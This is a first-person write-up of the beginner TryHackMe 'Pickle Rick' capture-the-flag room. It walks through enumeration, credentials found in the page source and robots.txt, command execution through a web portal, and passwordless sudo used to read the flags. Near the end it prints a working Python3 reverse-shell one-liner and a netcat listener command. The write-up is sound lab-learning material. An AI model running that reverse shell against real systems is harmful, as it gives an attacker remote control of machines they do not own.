# Pickle Rick Writeup

This CTF is a very easy but also one of my first ever done CTF.
It is on tryhackme, link: https://tryhackme.com/room/picklerick   

---  
<br>  

![show](assets/image_1.png)   


## I first ran nmap, nikto and gobuster:   

![nikto,gobuster and nmap](assets/image_2.png)

We can find:
/login.php (200)
/robots.txt(200)

and in 300:
/portal.php
/assets
  
After the basic enumeration, I looked a bit in the developer tools and,
I found something interesting in the source code:  

![username](assets/image_3.png)   

I then took a look at robots.txt:

![password](assets/image_4.png)   

We can then try it in the login page, and .... It works!  

![login](assets/image_5.png)  

![portal.php](assets/image_6.png) 

In the writable field you can then write commands, for example "whoami":  

![whoami](assets/image_7.png)  

After a ls -al command you can see "Sup3rS3cretPickl3Ingred.txt", but you can't cat it...   

![cat](assets/image_8.png)  

So I tried to less it, and it works!

![flag1](assets/image_9.png) 

You can actually already find the second flag 

![flag2](assets/image_10.png)

BUT when using the command "sudo -l" to see what command we can run, we see something interesting:

![sudo](assets/image_11.png)

We can run all commands with no password.
SO, we can run "sudo ls -al /root" And there it is!

![flag3](assets/image_12.png)

So with a simple "sudo less /root/3rd.txt, We get the 3rd and last flag!

---
# Other technique of resolution   

This works, but isn't the cleanest technique, we could also send a reverse shell, the python one works, but only python3!  

From: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  

### Don't foget to put your IP and port if you want!  
<br>  

- Shell: export RHOST="<IP>";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

- Listener: nc -lvnp 4444   
  
You can then work directly from your terminal!

![shell](assets/image_13.png)  

---  

# Hope you enjoyed it!

### Contact: alex.spiesberger@gmail.com





  

